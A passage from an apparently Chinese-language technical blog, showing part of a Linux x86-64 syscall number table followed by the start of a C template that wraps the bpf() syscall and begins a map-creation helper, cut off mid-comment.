style="text-align:center">common</td><td style="text-align:center">219</td></tr><tr><td style="text-align:center">semtimedop</td><td style="text-align:center">common</td><td style="text-align:center">220</td></tr><tr><td style="text-align:center">fadvise64</td><td style="text-align:center">common</td><td style="text-align:center">221</td></tr><tr><td style="text-align:center">timer_create</td><td style="text-align:center">64</td><td style="text-align:center">222</td></tr><tr><td style="text-align:center">timer_settime</td><td style="text-align:center">common</td><td style="text-align:center">223</td></tr><tr><td style="text-align:center">timer_gettime</td><td style="text-align:center">common</td><td style="text-align:center">224</td></tr><tr><td style="text-align:center">timer_getoverrun</td><td style="text-align:center">common</td><td style="text-align:center">225</td></tr><tr><td style="text-align:center">timer_delete</td><td style="text-align:center">common</td><td style="text-align:center">226</td></tr><tr><td style="text-align:center">clock_settime</td><td style="text-align:center">common</td><td style="text-align:center">227</td></tr><tr><td style="text-align:center">clock_gettime</td><td style="text-align:center">common</td><td style="text-align:center">228</td></tr><tr><td style="text-align:center">clock_getres</td><td style="text-align:center">common</td><td style="text-align:center">229</td></tr><tr><td style="text-align:center">clock_nanosleep</td><td style="text-align:center">common</td><td style="text-align:center">230</td></tr><tr><td style="text-align:center">exit_group</td><td style="text-align:center">common</td><td style="text-align:center">231</td></tr><tr><td style="text-align:center">epoll_wait</td><td style="text-align:center">common</td><td style="text-align:center">232</td></tr><tr><td style="text-align:center">epoll_ctl</td><td style="text-align:center">common</td><td style="text-align:center">233</td></tr><tr><td style="text-align:center">tgkill</td><td style="text-align:center">common</td><td style="text-align:center">234</td></tr><tr><td style="text-align:center">utimes</td><td style="text-align:center">common</td><td style="text-align:center">235</td></tr><tr><td style="text-align:center">vserver</td><td style="text-align:center">64</td><td style="text-align:center">236</td></tr><tr><td style="text-align:center">mbind</td><td style="text-align:center">common</td><td style="text-align:center">237</td></tr><tr><td style="text-align:center">set_mempolicy</td><td style="text-align:center">common</td><td style="text-align:center">238</td></tr><tr><td style="text-align:center">get_mempolicy</td><td style="text-align:center">common</td><td style="text-align:center">239</td></tr><tr><td style="text-align:center">mq_open</td><td style="text-align:center">common</td><td style="text-align:center">240</td></tr><tr><td style="text-align:center">mq_unlink</td><td style="text-align:center">common</td><td style="text-align:center">241</td></tr><tr><td style="text-align:center">mq_timedsend</td><td style="text-align:center">common</td><td style="text-align:center">242</td></tr><tr><td style="text-align:center">mq_timedreceive</td><td style="text-align:center">common</td><td style="text-align:center">243</td></tr><tr><td style="text-align:center">mq_notify</td><td style="text-align:center">64</td><td style="text-align:center">244</td></tr><tr><td style="text-align:center">mq_getsetattr</td><td style="text-align:center">common</td><td style="text-align:center">245</td></tr><tr><td style="text-align:center">kexec_load</td><td style="text-align:center">64</td><td style="text-align:center">246</td></tr><tr><td style="text-align:center">waitid</td><td style="text-align:center">64</td><td style="text-align:center">247</td></tr><tr><td style="text-align:center">add_key</td><td style="text-align:center">common</td><td style="text-align:center">248</td></tr><tr><td style="text-align:center">request_key</td><td style="text-align:center">common</td><td style="text-align:center">249</td></tr><tr><td style="text-align:center">keyctl</td><td style="text-align:center">common</td><td style="text-align:center">250</td></tr><tr><td style="text-align:center">ioprio_set</td><td style="text-align:center">common</td><td style="text-align:center">251</td></tr><tr><td style="text-align:center">ioprio_get</td><td style="text-align:center">common</td><td style="text-align:center">252</td></tr><tr><td style="text-align:center">inotify_init</td><td style="text-align:center">common</td><td style="text-align:center">253</td></tr><tr><td style="text-align:center">inotify_add_watch</td><td style="text-align:center">common</td><td style="text-align:center">254</td></tr><tr><td style="text-align:center">inotify_rm_watch</td><td style="text-align:center">common</td><td style="text-align:center">255</td></tr><tr><td style="text-align:center">migrate_pages</td><td style="text-align:center">common</td><td style="text-align:center">256</td></tr><tr><td style="text-align:center">openat</td><td style="text-align:center">common</td><td style="text-align:center">257</td></tr><tr><td style="text-align:center">mkdirat</td><td style="text-align:center">common</td><td style="text-align:center">258</td></tr><tr><td style="text-align:center">mknodat</td><td style="text-align:center">common</td><td style="text-align:center">259</td></tr><tr><td style="text-align:center">fchownat</td><td style="text-align:center">common</td><td style="text-align:center">260</td></tr><tr><td style="text-align:center">futimesat</td><td style="text-align:center">common</td><td style="text-align:center">261</td></tr><tr><td style="text-align:center">newfstatat</td><td style="text-align:center">common</td><td style="text-align:center">262</td></tr><tr><td style="text-align:center">unlinkat</td><td style="text-align:center">common</td><td style="text-align:center">263</td></tr><tr><td style="text-align:center">renameat</td><td style="text-align:center">common</td><td style="text-align:center">264</td></tr><tr><td style="text-align:center">linkat</td><td style="text-align:center">common</td><td style="text-align:center">265</td></tr><tr><td style="text-align:center">symlinkat</td><td style="text-align:center">common</td><td style="text-align:center">266</td></tr><tr><td style="text-align:center">readlinkat</td><td style="text-align:center">common</td><td style="text-align:center">267</td></tr><tr><td style="text-align:center">fchmodat</td><td style="text-align:center">common</td><td style="text-align:center">268</td></tr><tr><td style="text-align:center">faccessat</td><td style="text-align:center">common</td><td style="text-align:center">269</td></tr><tr><td style="text-align:center">pselect6</td><td style="text-align:center">common</td><td style="text-align:center">270</td></tr><tr><td style="text-align:center">ppoll</td><td style="text-align:center">common</td><td style="text-align:center">271</td></tr><tr><td style="text-align:center">unshare</td><td style="text-align:center">common</td><td style="text-align:center">272</td></tr><tr><td style="text-align:center">set_robust_list</td><td style="text-align:center">64</td><td style="text-align:center">273</td></tr><tr><td style="text-align:center">get_robust_list</td><td style="text-align:center">64</td><td style="text-align:center">274</td></tr><tr><td style="text-align:center">splice</td><td style="text-align:center">common</td><td style="text-align:center">275</td></tr><tr><td style="text-align:center">tee</td><td style="text-align:center">common</td><td style="text-align:center">276</td></tr><tr><td style="text-align:center">sync_file_range</td><td style="text-align:center">common</td><td style="text-align:center">277</td></tr><tr><td style="text-align:center">vmsplice</td><td style="text-align:center">64</td><td style="text-align:center">278</td></tr><tr><td style="text-align:center">move_pages</td><td style="text-align:center">64</td><td style="text-align:center">279</td></tr><tr><td style="text-align:center">utimensat</td><td style="text-align:center">common</td><td style="text-align:center">280</td></tr><tr><td style="text-align:center">epoll_pwait</td><td style="text-align:center">common</td><td style="text-align:center">281</td></tr><tr><td style="text-align:center">signalfd</td><td style="text-align:center">common</td><td style="text-align:center">282</td></tr><tr><td style="text-align:center">timerfd_create</td><td style="text-align:center">common</td><td style="text-align:center">283</td></tr><tr><td style="text-align:center">eventfd</td><td style="text-align:center">common</td><td style="text-align:center">284</td></tr><tr><td style="text-align:center">fallocate</td><td style="text-align:center">common</td><td style="text-align:center">285</td></tr><tr><td style="text-align:center">timerfd_settime</td><td style="text-align:center">common</td><td style="text-align:center">286</td></tr><tr><td style="text-align:center">timerfd_gettime</td><td style="text-align:center">common</td><td style="text-align:center">287</td></tr><tr><td style="text-align:center">accept4</td><td style="text-align:center">common</td><td style="text-align:center">288</td></tr><tr><td style="text-align:center">signalfd4</td><td style="text-align:center">common</td><td style="text-align:center">289</td></tr><tr><td style="text-align:center">eventfd2</td><td style="text-align:center">common</td><td style="text-align:center">290</td></tr><tr><td style="text-align:center">epoll_create1</td><td style="text-align:center">common</td><td style="text-align:center">291</td></tr><tr><td style="text-align:center">dup3</td><td style="text-align:center">common</td><td style="text-align:center">292</td></tr><tr><td style="text-align:center">pipe2</td><td style="text-align:center">common</td><td style="text-align:center">293</td></tr><tr><td style="text-align:center">inotify_init1</td><td style="text-align:center">common</td><td style="text-align:center">294</td></tr><tr><td style="text-align:center">preadv</td><td style="text-align:center">64</td><td style="text-align:center">295</td></tr><tr><td style="text-align:center">pwritev</td><td style="text-align:center">64</td><td style="text-align:center">296</td></tr><tr><td style="text-align:center">rt_tgsigqueueinfo</td><td style="text-align:center">64</td><td style="text-align:center">297</td></tr><tr><td style="text-align:center">perf_event_open</td><td style="text-align:center">common</td><td style="text-align:center">298</td></tr><tr><td style="text-align:center">recvmmsg</td><td style="text-align:center">64</td><td style="text-align:center">299</td></tr><tr><td style="text-align:center">fanotify_init</td><td style="text-align:center">common</td><td style="text-align:center">300</td></tr><tr><td style="text-align:center">fanotify_mark</td><td style="text-align:center">common</td><td style="text-align:center">301</td></tr><tr><td style="text-align:center">prlimit64</td><td style="text-align:center">common</td><td style="text-align:center">302</td></tr><tr><td style="text-align:center">name_to_handle_at</td><td style="text-align:center">common</td><td style="text-align:center">303</td></tr><tr><td style="text-align:center">open_by_handle_at</td><td style="text-align:center">common</td><td style="text-align:center">304</td></tr><tr><td style="text-align:center">clock_adjtime</td><td style="text-align:center">common</td><td style="text-align:center">305</td></tr><tr><td style="text-align:center">syncfs</td><td style="text-align:center">common</td><td style="text-align:center">306</td></tr><tr><td style="text-align:center">sendmmsg</td><td style="text-align:center">64</td><td style="text-align:center">307</td></tr><tr><td style="text-align:center">setns</td><td style="text-align:center">common</td><td style="text-align:center">308</td></tr><tr><td style="text-align:center">getcpu</td><td style="text-align:center">common</td><td style="text-align:center">309</td></tr><tr><td style="text-align:center">process_vm_readv</td><td style="text-align:center">64</td><td style="text-align:center">310</td></tr><tr><td style="text-align:center">process_vm_writev</td><td style="text-align:center">64</td><td style="text-align:center">311</td></tr><tr><td style="text-align:center">kcmp</td><td style="text-align:center">common</td><td style="text-align:center">312</td></tr><tr><td style="text-align:center">finit_module</td><td style="text-align:center">common</td><td style="text-align:center">313</td></tr><tr><td style="text-align:center">sched_setattr</td><td style="text-align:center">common</td><td style="text-align:center">314</td></tr><tr><td style="text-align:center">sched_getattr</td><td style="text-align:center">common</td><td style="text-align:center">315</td></tr><tr><td style="text-align:center">renameat2</td><td style="text-align:center">common</td><td style="text-align:center">316</td></tr><tr><td style="text-align:center">seccomp</td><td style="text-align:center">common</td><td style="text-align:center">317</td></tr><tr><td style="text-align:center">getrandom</td><td style="text-align:center">common</td><td style="text-align:center">318</td></tr><tr><td style="text-align:center">memfd_create</td><td style="text-align:center">common</td><td style="text-align:center">319</td></tr><tr><td style="text-align:center">kexec_file_load</td><td style="text-align:center">common</td><td style="text-align:center">320</td></tr><tr><td style="text-align:center">bpf</td><td style="text-align:center">common</td><td style="text-align:center">321</td></tr><tr><td style="text-align:center">execveat</td><td style="text-align:center">64</td><td style="text-align:center">322</td></tr><tr><td style="text-align:center">userfaultfd</td><td style="text-align:center">common</td><td style="text-align:center">323</td></tr><tr><td style="text-align:center">membarrier</td><td style="text-align:center">common</td><td style="text-align:center">324</td></tr><tr><td style="text-align:center">mlock2</td><td style="text-align:center">common</td><td style="text-align:center">325</td></tr><tr><td style="text-align:center">copy_file_range</td><td style="text-align:center">common</td><td style="text-align:center">326</td></tr><tr><td style="text-align:center">preadv2</td><td style="text-align:center">64</td><td style="text-align:center">327</td></tr><tr><td style="text-align:center">pwritev2</td><td style="text-align:center">64</td><td style="text-align:center">328</td></tr><tr><td style="text-align:center">pkey_mprotect</td><td style="text-align:center">common</td><td style="text-align:center">329</td></tr><tr><td style="text-align:center">pkey_alloc</td><td style="text-align:center">common</td><td style="text-align:center">330</td></tr><tr><td style="text-align:center">pkey_free</td><td style="text-align:center">common</td><td style="text-align:center">331</td></tr><tr><td style="text-align:center">statx</td><td style="text-align:center">common</td><td style="text-align:center">332</td></tr><tr><td style="text-align:center">io_pgetevents</td><td style="text-align:center">common</td><td style="text-align:center">333</td></tr><tr><td style="text-align:center">rseq</td><td style="text-align:center">common</td><td style="text-align:center">334</td></tr><tr><td style="text-align:center">pidfd_send_signal</td><td style="text-align:center">common</td><td style="text-align:center">424</td></tr><tr><td style="text-align:center">io_uring_setup</td><td style="text-align:center">common</td><td style="text-align:center">425</td></tr><tr><td style="text-align:center">io_uring_enter</td><td style="text-align:center">common</td><td style="text-align:center">426</td></tr><tr><td style="text-align:center">io_uring_register</td><td style="text-align:center">common</td><td style="text-align:center">427</td></tr><tr><td style="text-align:center">open_tree</td><td style="text-align:center">common</td><td style="text-align:center">428</td></tr><tr><td style="text-align:center">move_mount</td><td style="text-align:center">common</td><td style="text-align:center">429</td></tr><tr><td style="text-align:center">fsopen</td><td style="text-align:center">common</td><td style="text-align:center">430</td></tr><tr><td style="text-align:center">fsconfig</td><td style="text-align:center">common</td><td style="text-align:center">431</td></tr><tr><td style="text-align:center">fsmount</td><td style="text-align:center">common</td><td style="text-align:center">432</td></tr><tr><td style="text-align:center">fspick</td><td style="text-align:center">common</td><td style="text-align:center">433</td></tr><tr><td style="text-align:center">pidfd_open</td><td style="text-align:center">common</td><td style="text-align:center">434</td></tr><tr><td style="text-align:center">clone3</td><td style="text-align:center">common</td><td style="text-align:center">435</td></tr><tr><td style="text-align:center">close_range</td><td style="text-align:center">common</td><td style="text-align:center">436</td></tr><tr><td style="text-align:center">openat2</td><td style="text-align:center">common</td><td style="text-align:center">437</td></tr><tr><td style="text-align:center">pidfd_getfd</td><td style="text-align:center">common</td><td style="text-align:center">438</td></tr><tr><td style="text-align:center">faccessat2</td><td style="text-align:center">common</td><td style="text-align:center">439</td></tr><tr><td style="text-align:center">process_madvise</td><td style="text-align:center">common</td><td style="text-align:center">440</td></tr><tr><td style="text-align:center">epoll_pwait2</td><td style="text-align:center">common</td><td style="text-align:center">441</td></tr><tr><td style="text-align:center">mount_setattr</td><td style="text-align:center">common</td><td style="text-align:center">442</td></tr><tr><td style="text-align:center">quotactl_fd</td><td style="text-align:center">common</td><td style="text-align:center">443</td></tr><tr><td style="text-align:center">landlock_create_ruleset</td><td style="text-align:center">common</td><td style="text-align:center">444</td></tr><tr><td style="text-align:center">landlock_add_rule</td><td style="text-align:center">common</td><td style="text-align:center">445</td></tr><tr><td style="text-align:center">landlock_restrict_self</td><td style="text-align:center">common</td><td style="text-align:center">446</td></tr><tr><td style="text-align:center">memfd_secret</td><td style="text-align:center">common</td><td style="text-align:center">447</td></tr><tr><td style="text-align:center">process_mrelease</td><td style="text-align:center">common</td><td style="text-align:center">448</td></tr><tr><td style="text-align:center">futex_waitv</td><td style="text-align:center">common</td><td style="text-align:center">449</td></tr><tr><td style="text-align:center">set_mempolicy_home_node</td><td style="text-align:center">common</td><td style="text-align:center">450</td></tr><tr><td style="text-align:center">rt_sigaction</td><td style="text-align:center">x32</td><td style="text-align:center">512</td></tr><tr><td style="text-align:center">rt_sigreturn</td><td style="text-align:center">x32</td><td style="text-align:center">513</td></tr><tr><td style="text-align:center">ioctl</td><td style="text-align:center">x32</td><td style="text-align:center">514</td></tr><tr><td style="text-align:center">readv</td><td style="text-align:center">x32</td><td style="text-align:center">515</td></tr><tr><td style="text-align:center">writev</td><td style="text-align:center">x32</td><td style="text-align:center">516</td></tr><tr><td style="text-align:center">recvfrom</td><td style="text-align:center">x32</td><td style="text-align:center">517</td></tr><tr><td style="text-align:center">sendmsg</td><td style="text-align:center">x32</td><td style="text-align:center">518</td></tr><tr><td style="text-align:center">recvmsg</td><td style="text-align:center">x32</td><td style="text-align:center">519</td></tr><tr><td style="text-align:center">execve</td><td style="text-align:center">x32</td><td style="text-align:center">520</td></tr><tr><td style="text-align:center">ptrace</td><td style="text-align:center">x32</td><td style="text-align:center">521</td></tr><tr><td style="text-align:center">rt_sigpending</td><td style="text-align:center">x32</td><td style="text-align:center">522</td></tr><tr><td style="text-align:center">rt_sigtimedwait</td><td style="text-align:center">x32</td><td style="text-align:center">523</td></tr><tr><td style="text-align:center">rt_sigqueueinfo</td><td style="text-align:center">x32</td><td style="text-align:center">524</td></tr><tr><td style="text-align:center">sigaltstack</td><td style="text-align:center">x32</td><td style="text-align:center">525</td></tr><tr><td style="text-align:center">timer_create</td><td style="text-align:center">x32</td><td style="text-align:center">526</td></tr><tr><td style="text-align:center">mq_notify</td><td style="text-align:center">x32</td><td style="text-align:center">527</td></tr><tr><td style="text-align:center">kexec_load</td><td style="text-align:center">x32</td><td style="text-align:center">528</td></tr><tr><td style="text-align:center">waitid</td><td style="text-align:center">x32</td><td style="text-align:center">529</td></tr><tr><td style="text-align:center">set_robust_list</td><td style="text-align:center">x32</td><td style="text-align:center">530</td></tr><tr><td style="text-align:center">get_robust_list</td><td style="text-align:center">x32</td><td style="text-align:center">531</td></tr><tr><td style="text-align:center">vmsplice</td><td style="text-align:center">x32</td><td style="text-align:center">532</td></tr><tr><td style="text-align:center">move_pages</td><td style="text-align:center">x32</td><td style="text-align:center">533</td></tr><tr><td style="text-align:center">preadv</td><td style="text-align:center">x32</td><td style="text-align:center">534</td></tr><tr><td style="text-align:center">pwritev</td><td style="text-align:center">x32</td><td style="text-align:center">535</td></tr><tr><td style="text-align:center">rt_tgsigqueueinfo</td><td style="text-align:center">x32</td><td style="text-align:center">536</td></tr><tr><td style="text-align:center">recvmmsg</td><td style="text-align:center">x32</td><td style="text-align:center">537</td></tr><tr><td style="text-align:center">sendmmsg</td><td style="text-align:center">x32</td><td style="text-align:center">538</td></tr><tr><td style="text-align:center">process_vm_readv</td><td style="text-align:center">x32</td><td style="text-align:center">539</td></tr><tr><td style="text-align:center">process_vm_writev</td><td style="text-align:center">x32</td><td style="text-align:center">540</td></tr><tr><td style="text-align:center">setsockopt</td><td style="text-align:center">x32</td><td style="text-align:center">541</td></tr><tr><td style="text-align:center">getsockopt</td><td style="text-align:center">x32</td><td style="text-align:center">542</td></tr><tr><td style="text-align:center">io_setup</td><td style="text-align:center">x32</td><td style="text-align:center">543</td></tr><tr><td style="text-align:center">io_submit</td><td style="text-align:center">x32</td><td style="text-align:center">544</td></tr><tr><td style="text-align:center">execveat</td><td style="text-align:center">x32</td><td style="text-align:center">545</td></tr><tr><td style="text-align:center">preadv2</td><td style="text-align:center">x32</td><td style="text-align:center">546</td></tr><tr><td style="text-align:center">pwritev2</td><td style="text-align:center">x32</td><td style="text-align:center">547</td></tr></tbody></table></div><h4 id="BPF姿势"><a href="#BPF姿势" class="headerlink" title="BPF姿势"></a>BPF姿势</h4><p>下面是一个BPF的模板<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(!(cond)) \</span></span><br><span class="line"><span class="meta">    &#123; \</span></span><br><span class="line"><span class="meta">        printf(<span class="string">&quot;Line:%d: &#x27;%s&#x27; assertion failed\n&quot;</span>, \</span></span><br><span class="line"><span class="meta">               __LINE__, #cond); \</span></span><br><span class="line"><span class="meta">        perror(#cond); \</span></span><br><span class="line"><span class="meta">        fflush(stdout); \</span></span><br><span class="line"><span class="meta">        exit(EXIT_FAILURE); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ebpf用户态helper宏和函数</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. @cmd，表明bpf()执行的操作</span></span><br><span class="line"><span class="comment"> *      2. @attr，表明此次执行的操作的参数</span></span><br><span class="line"><span class="comment"> *      3. @size，即@attr union结构体的大小</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(SYS_bpf, cmd, attr, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_create_map()创建一个新的map，并且返回该map对应的文件描述符</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. @map_type：即该map的类型，可以通过man bpf，搜索</span></span><br><span class="line"><span class="comment"> * bpf_map_type \&#123;关键词查看</span></span><br><span class="line"><span class="comment"> *      2. @key_size: 即map的key元素的字节数</span></span><br><span 